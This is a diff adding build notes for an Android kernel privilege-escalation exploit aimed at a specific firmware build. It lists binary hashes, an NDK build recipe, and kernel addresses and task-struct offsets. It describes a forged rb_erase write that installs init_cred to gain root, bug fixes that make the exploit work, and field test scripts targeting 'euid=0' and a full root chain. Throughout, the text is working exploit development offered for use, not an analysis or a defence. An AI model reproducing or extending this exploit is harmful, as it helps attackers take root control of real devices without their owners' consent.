@@ -1,0 +1,55 @@
+SHA256 preload.so: 7f74af2dd6766c5b794e9a8efc789c7f5a72a355495d34b46fae1182c3bcf78d
+SHA256 su_daemon:  12c937a0790f604ed084aa8c155cc5f7cc05767c7c00bd5ae6d97ad23f8c218f
+
+BUILD_ENV: NDK r29 linux (fresh download 2026-09-02, clang 21.0.0 r563880c),
+  API 35, PROJECT=matisse-OS2.0.6.0.ULKCNXM,
+  sources=research/mt11_v30_src (= mt71 lineage) + mt72 main.c only.
+  su_daemon SHA identical to mt58-71 (byte-identical lineage).
+  preload.so 188632 bytes; 4 known-harmless unused-variable warnings,
+  same set as mt58-71 builds.
+
+mt72 changes (main.c only, two, both in the E4 pi-tree geometry):
+(a) E4 pi_tree write mode, env PSELECT_PTR_PI=1:
+    PI_PC(word3)=init_cred alias (env PSELECT_PTR_VALUE override, default
+    P0_DATA_ALIAS_CONST(INIT_CRED)=ffffff80027b0ae0), PI_RIGHT(word4)=
+    task+0x780 (env PSELECT_PTR_TARGET_OFF override, default 0x780),
+    PI_LEFT=0 -> rb_erase CASE_A on the pi_tree_entry:
+      check *(init_cred+0x10)==node? ne -> STORE(a) *(init_cred+8)=task+0x780
+      (gid/suid pollution, harmless) -> STORE(b) *(task+0x780)=init_cred
+      (THE cred write). child!=0 -> no rebalance, no rotation stray writes.
+    Main tree harmlesss: TREE_PC=fake_lock spray zero region, RIGHT=LEFT=0
+    -> CASE_A child=0 -> only *(fake_lock+8)=0 (zero-region self-write).
+    aborts attempt if fake_lock==0 (no spray page).
+(b) BUG FIX (would have made every E4 run a silent no-op): the attempt loop
+    unconditionally reset PSELECT_PI_PC/RIGHT/LEFT to "0" AFTER the mode
+    blocks, wiping the E4 PI words -> pi erase degenerated to the all-zero
+    root path. Now guarded with if (!getenv("PSELECT_PTR_PI")).
+(c) BUG FIX (silent single-shot): PI rounds now setenv PSELECT_PTR_STAGE=C
+    so slide.c mt51 mid-burst abort uses the C signal (euid==0) instead of
+    the default R signal (CapEff full) — in external E4 rounds after R
+    landed, CapEff is already full and the R signal would false-abort after
+    the first shot.
+
+RECIPE: IonStack exploit Makefile + mt11_v30_src sources + IonStack
+  src/kernelsnitch headers + IonStack src/{su_blob.S,wallpaper_blob.S} +
+  assets/wallpaper.webp; make PROJECT=matisse-OS2.0.6.0.ULKCNXM
+  NDK_ROOT=<ndk-r29>.
+
+VERIFICATION: ELF aarch64 shared object; marker strings present:
+  "mt72: PI-write" x1, "mt72: PTR_PI but no spray page" x1, mt51 stage-aware,
+  mt66 watchdog/window/root_alive, mt61 window, mt59 STALL, mt19b, mt25.
+  Reran scripts/{disasm,find_callers,find_offset_access,dump_task_fields}.py
+  against ref/kernel_with_symbols.elf post-rebuild: init_task dump matches
+  CHECKPOINT (0x778/0x780=init_cred, 0x788=0, 0x790="swapper"); rb_erase
+  CASE_A sequence byte-identical; 0x788 has zero task-related accessors.
+
+FIELD EXPECTATIONS (experiment matrix in CHECKPOINT §九):
+  E4a (termux/run_E4a_test.sh): fork + PSELECT_PTR_PI=1 -> child status
+    "euid=0 CapEff=0000000000000000" = PI geometry lands (half state safe).
+  E4b (termux/run_E4b_chain.sh): R fork round then external E4 round on the
+    same child -> root_alive.txt / ROOT-SEEN = full root chain.
+  E1 (termux/run_E1_gradient.sh): PC_OFF {0x770,0x788,0x778} gradient ->
+    0x788 comm corruption discriminates H2 (erase not executing) vs H3
+    (write lands but gets neutralized).
+  E2 forensics built into all three: 1s sampler (comm/state/status history)
+    + final mt49_child_status.txt collection.
